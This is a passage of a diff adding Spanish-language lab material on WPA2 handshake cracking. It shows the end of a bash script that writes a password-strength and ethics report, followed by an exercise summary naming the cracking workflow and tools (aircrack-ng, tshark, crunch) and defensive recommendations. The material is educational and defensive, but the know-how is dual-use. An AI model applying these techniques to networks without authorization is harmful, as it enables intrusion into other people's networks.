+        echo "⚠️ VULNERABILIDAD ALTA:" >> "$OUTPUT"
+        echo "  - Contraseña débil ($PASS_LENGTH caracteres)" >> "$OUTPUT"
+        echo "  - Puede ser encontrada con wordlists extendidas" >> "$OUTPUT"
+        echo "  - Recomendación: Aumentar a 16+ caracteres" >> "$OUTPUT"
+    elif [ $PASS_LENGTH -lt 16 ]; then
+        echo "⚠️ VULNERABILIDAD MODERADA:" >> "$OUTPUT"
+        echo "  - Contraseña moderada ($PASS_LENGTH caracteres)" >> "$OUTPUT"
+        echo "  - Resistente a wordlists básicas" >> "$OUTPUT"
+        echo "  - Recomendación: Aumentar a 16+ para máxima seguridad" >> "$OUTPUT"
+    else
+        echo "✓ CONTRASEÑA FUERTE:" >> "$OUTPUT"
+        echo "  - Longitud adecuada ($PASS_LENGTH caracteres)" >> "$OUTPUT"
+        echo "  - Resistente a la mayoría de ataques de diccionario" >> "$OUTPUT"
+        echo "  - Si tiene alta entropía, es considerada segura" >> "$OUTPUT"
+    fi
+fi
+
+echo "" >> "$OUTPUT"
+
+# Sección 5: Lecciones Aprendidas
+echo "───────────────────────────────────────────────────────────" >> "$OUTPUT"
+echo "5. LECCIONES DEFENSIVAS APRENDIDAS" >> "$OUTPUT"
+echo "───────────────────────────────────────────────────────────" >> "$OUTPUT"
+echo "" >> "$OUTPUT"
+echo "Este ejercicio demuestra por qué es crucial:" >> "$OUTPUT"
+echo "" >> "$OUTPUT"
+echo "✓ Usar contraseñas WPA2 de 16+ caracteres" >> "$OUTPUT"
+echo "✓ Combinar mayúsculas, minúsculas, números y símbolos" >> "$OUTPUT"
+echo "✓ Evitar palabras del diccionario y patrones comunes" >> "$OUTPUT"
+echo "✓ No usar información personal (nombres, fechas)" >> "$OUTPUT"
+echo "✓ Cambiar contraseñas periódicamente" >> "$OUTPUT"
+echo "✓ Considerar WPA3 si el hardware lo soporta" >> "$OUTPUT"
+echo "✓ Habilitar 802.11w (Management Frame Protection)" >> "$OUTPUT"
+echo "✓ Monitorear intentos de captura de handshakes" >> "$OUTPUT"
+echo "" >> "$OUTPUT"
+
+echo "Ejemplo de contraseña FUERTE para WPA2:" >> "$OUTPUT"
+echo "  \"Montaña-Verde#2024!Segura$Café\"" >> "$OUTPUT"
+echo "  (32 caracteres, alta entropía, imposible de crackear con fuerza bruta)" >> "$OUTPUT"
+echo "" >> "$OUTPUT"
+
+# Sección 6: Consideraciones Éticas
+echo "───────────────────────────────────────────────────────────" >> "$OUTPUT"
+echo "6. CONSIDERACIONES ÉTICAS Y LEGALES" >> "$OUTPUT"
+echo "───────────────────────────────────────────────────────────" >> "$OUTPUT"
+echo "" >> "$OUTPUT"
+echo "⚠️ IMPORTANTE:" >> "$OUTPUT"
+echo "" >> "$OUTPUT"
+echo "Este ejercicio es EXCLUSIVAMENTE educativo y defensivo." >> "$OUTPUT"
+echo "" >> "$OUTPUT"
+echo "Está PROHIBIDO:" >> "$OUTPUT"
+echo "  ✗ Capturar handshakes de redes sin autorización" >> "$OUTPUT"
+echo "  ✗ Intentar crackear contraseñas de redes ajenas" >> "$OUTPUT"
+echo "  ✗ Acceder a redes WiFi sin permiso explícito" >> "$OUTPUT"
+echo "  ✗ Distribuir herramientas de cracking sin contexto educativo" >> "$OUTPUT"
+echo "" >> "$OUTPUT"
+echo "Está PERMITIDO:" >> "$OUTPUT"
+echo "  ✓ Analizar PCAPs de laboratorios educativos" >> "$OUTPUT"
+echo "  ✓ Probar seguridad de redes propias" >> "$OUTPUT"
+echo "  ✓ Realizar auditorías con autorización por escrito" >> "$OUTPUT"
+echo "  ✓ Desarrollar defensas contra estos ataques" >> "$OUTPUT"
+echo "" >> "$OUTPUT"
+echo "El uso no autorizado puede resultar en consecuencias legales graves." >> "$OUTPUT"
+echo "" >> "$OUTPUT"
+
+echo "═══════════════════════════════════════════════════════════" >> "$OUTPUT"
+echo "FIN DEL REPORTE" >> "$OUTPUT"
+echo "═══════════════════════════════════════════════════════════" >> "$OUTPUT"
+
+echo "[✓] Reporte generado en: $OUTPUT"
+echo ""
+cat "$OUTPUT"
+```
+
+**Guardar y ejecutar:**
+```bash
+chmod +x wpa2_crack_report.sh
+./wpa2_crack_report.sh
+```
+
+---
+
+### 🎓 Resumen del Ejercicio 10
+
+**Has aprendido:**
+
+✅ **Conceptos de criptografía WPA2:**
+- PMK (Pairwise Master Key) derivada con PBKDF2
+- PTK (Pairwise Transient Key) derivada con PRF-512
+- MIC (Message Integrity Code) para verificar contraseñas
+- ANonce y SNonce (números aleatorios del handshake)
+
+✅ **Proceso de cracking:**
+- Captura del 4-way handshake completo (4 frames EAPOL)
+- Uso de wordlists (diccionarios de contraseñas)
+- Verificación offline mediante cálculo de MIC
+- Velocidad de cracking según hardware
+
+✅ **Seguridad defensiva:**
+- Importancia de contraseñas fuertes (16+ caracteres)
+- Alta entropía (mayúsculas + minúsculas + números + símbolos)
+- Evitar palabras del diccionario y patrones predecibles
+- Considerar WPA3 como evolución de WPA2
+
+✅ **Herramientas:**
+- `aircrack-ng` para cracking de WPA2
+- `tshark` para extracción de componentes
+- `crunch` para generación de wordlists
+- Scripts bash para automatización y reportes
+
+✅ **Aspectos éticos:**
+- Diferencia entre hacking ético y malicioso
+- Importancia de la autorización
+- Consecuencias legales del uso indebido
+- Aplicación defensiva del conocimiento
+
+**Recomendaciones finales para administradores:**
+
+1. **Contraseñas WiFi corporativas**: 20+ caracteres, cambio cada 3 meses
+2. **Contraseñas WiFi domésticas**: 16+ caracteres mínimo
+3. **Migrar a WPA3** donde sea posible (resistente a offline cracking)
+4. **Habilitar 802.11w** (Management Frame Protection) para prevenir deauth attacks
+5. **Monitorear**: Implementar WIDS (Wireless Intrusion Detection System)
+6. **Auditorías periódicas**: Probar fortaleza de contraseñas con autorización
+
+**Próximo ejercicio:** Ejercicio 11 - Auditoría Completa de Red WiFi (integrador)
+
+---
